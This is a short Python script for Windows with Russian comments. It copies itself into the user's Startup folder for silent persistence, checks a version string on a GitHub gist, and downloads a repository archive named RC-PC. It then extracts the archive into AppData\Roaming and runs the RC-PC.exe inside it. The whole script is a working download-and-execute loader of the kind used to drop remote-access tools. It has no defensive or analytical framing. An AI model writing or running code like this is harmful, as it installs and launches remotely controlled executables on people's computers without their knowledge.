import os, wget, zipfile, requests, getpass, sys
user_path = os.path.expanduser('~') 
USER_NAME = getpass.getuser()
Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
tfn=Thisfile.replace(Thisfile_name, "")
user_path = os.path.expanduser('~') # Путь к папке пользователя
if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
    os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

result = requests.get("https://gist.github.com/bagaZh/8190cb05ca014a81d6fad8ff61bf2e33/raw/235b35e4c11a52323ec10366da4037081af7e133/version.txt")
last_ver = result.content.decode("utf-8")
a = open(f"{user_path}\\AppData\\Roaming\\version.txt", "r")
current_ver = a.read()
a.close()
if "RX" in last_ver: iadm=0
else: iadm=1
if last_ver != current_ver:
    url='https://github.com/bagaZh/RC-PC/archive/refs/heads/main.zip'
    wget.download(url)
    with zipfile.ZipFile("main.zip", 'r') as zip_ref:
        zip_ref.extractall(f"{user_path}\\AppData\\Roaming")
    
    os.system(f'copy "{user_path}\\AppData\\Roaming\\RC-PC\\RC-PC.exe" "{user_path}\\AppData\\Roaming"')
    os.system(f'copy "{user_path}\\AppData\\Roaming\\RC-PC\\version.txt" "{user_path}\\AppData\\Roaming"')
os.system(f"{user_path}\\AppData\\Roaming\\RC-PC.exe")